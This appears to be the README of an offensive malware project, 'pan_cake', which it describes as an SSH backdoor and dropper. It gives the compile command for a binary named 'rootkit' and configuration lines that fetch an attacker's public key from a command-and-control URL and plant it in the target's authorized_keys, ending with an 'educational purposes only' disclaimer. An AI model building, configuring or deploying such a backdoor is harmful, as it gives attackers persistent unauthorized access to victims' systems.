# pan_cake
It's main features consist of an SSH backdoor, and it has dropper capabilities. 

Pancake can be compiled with: `gcc backdoor.c net_functions.c -l curl -o rootkit`

Pancake needs a few things to work. These are libcurl, a command and control server with your public SSH key available for download, and that SSH is installed on the target machine. You will need to configure all of these in `backdoor.c`

# config
to configure pancake, go down to lines 31 through 33 and change them as needed. The variables that will need to be changed include: `config_1.url = "http://0.0.0.0/key.pub";`, `config_1.source_and_outfile = "/tmp/key.pub";`, and `config_1.destination = "~/.ssh/authorized_keys";`. 
  
  You don't necesarrily need to change any of them except for the CNC. I advise against changing `config_1.destination`


I am not responsible for anything you do with this. For educational purposes only. 
